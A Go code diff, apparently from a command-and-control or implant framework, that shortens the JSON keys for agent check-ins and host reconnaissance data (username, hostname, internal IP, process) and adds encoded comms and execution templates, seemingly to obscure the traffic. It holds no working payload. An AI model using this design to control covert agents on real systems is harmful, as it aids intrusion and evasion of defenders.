@@ -6,33 +6,35 @@ import "time"
 // PostData represents the incoming POST request data structure
 type PostData struct {
 	Data      string            `json:"data"`
-	Metadata  map[string]string `json:"metadata"`
-	Timestamp int64             `json:"timestamp"`
+	Metadata  map[string]string `json:"md"`
+	Timestamp int64             `json:"ts"`
 }
 
 // SignedResponse represents the response sent after initial handshake
 type SignedResponse struct {
-	Status             string `json:"status"`
-	NewClientID        string `json:"new_client_id"`
-	SecretsInitialized bool   `json:"secrets_initialized"`
-	Signature          string `json:"signature"`
+	Status             string `json:"st"`
+	NewClientID        string `json:"nc"`
+	SecretsInitialized bool   `json:"si"`
+	Signature          string `json:"sg"`
 	Seed               string `json:"seed"`
+	CommsTemplate      string `json:"ct,omitempty"` // Base64-encoded comms template
+	ExecReqTemplate    string `json:"et,omitempty"` // Base64-encoded exec requirements template
 }
 
 // SystemInfo represents the received system information from agents
 type SystemInfo struct {
 	AgentInfo struct {
 		PID         int       `json:"pid"`
-		ProcessName string    `json:"process_name"`
-		Username    string    `json:"username"`
-		Hostname    string    `json:"hostname"`
-		InternalIP  string    `json:"internal_ip"`
-		Arch        string    `json:"architecture"`
+		ProcessName string    `json:"pn"`
+		Username    string    `json:"un"`
+		Hostname    string    `json:"hn"`
+		InternalIP  string    `json:"ip"`
+		Arch        string    `json:"ac"`
 		OS          string    `json:"os"`
-		Timestamp   time.Time `json:"timestamp"`
-		ClientID    string    `json:"client_id"`
+		Timestamp   time.Time `json:"ts"`
+		ClientID    string    `json:"cl"`
 		Seed        string    `json:"seed"`
-	} `json:"agent_info"`
-	Metadata map[string]string `json:"metadata"`
-	Status   string            `json:"status"`
+	} `json:"ag"`
+	Metadata map[string]string `json:"md"`
+	Status   string            `json:"st"`
 }
